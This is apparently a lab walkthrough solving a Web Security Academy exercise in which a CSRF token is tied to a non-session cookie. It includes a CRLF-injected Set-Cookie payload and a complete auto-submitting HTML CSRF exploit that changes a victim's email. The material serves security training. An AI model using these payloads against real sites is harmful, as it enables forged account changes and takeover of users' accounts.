## Solution steps

- Login using the provided credentials.
- Open Burp Suite and set-up proxy.
- Submit the "Update email" form, and find the resulting request in your Proxy history.
- Send the request to Burp Repeater and observe that changing the `session` cookie logs you out, but changing the `csrfKey` cookie merely results in the CSRF token being rejected. This suggests that the `csrfKey` cookie may not be strictly tied to the session.
- Open a private/incognito browser window, log in to your other account, and send a fresh update email request into Burp Repeater.
- Observe that if you swap the `csrfKey` cookie and `csrf` parameter from the first account to the second account, the request is accepted.
- Close the Repeater tab and incognito browser.
- Back in the original browser, perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header. Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser.
- Create a URL that uses this vulnerability to inject your csrfKey cookie into the victim's browser:
  ```
  /?search=test
  Set-Cookie: csrfKey=YOUR-KEY; SameSite=None
  ```
- URL encode it using: https://gchq.github.io/CyberChef/
- It should look like this: `test%0D%0ASet-Cookie:%20csrfKey=YOUR-KEY;%20SameSite=None`
- Copy the contents of email change request and paste it in an online CSRF PoC Generator. I used: https://hacktify.in/csrf/
- Change the email address in your exploit so that it doesn't match your own.
- Copy the CSRF PoC FORM's contents and open the exploit server.
- Paste it in the `Body`.
- Instead of writing `<script>document.forms[0].submit();</script>` to submit the form, add the following code to inject the cookie:
  ```
  <img src="https://xxxxxx.web-security-academy.net//?search=test%0D%0ASet-Cookie:%20csrfKey=YOUR-KEY;%20SameSite=None" onerror="document.forms[0].submit()">
  ```
- Your final exploit must look like this:
  ```
  <html>
  	<body>
  		<form method="POST" action="https://xxxxx.web-security-academy.net/my-account/change-email">
  			<input type="hidden" name="email" value="tester@gmail.com"/>
  			<input type="hidden" name="csrf" value="YOUR-TOKEN"/>
  			<input type="submit" value="Submit">
  		</form>
  <img src="https://xxxx.web-security-academy.net//?search=test%0D%0ASet-Cookie:%20csrfKey=YOUR-KEY;%20SameSite=None" onerror="document.forms[0].submit()">
  	</body>
  <html>
  ```
- Store the exploit, then click "Deliver to victim" to solve the lab.
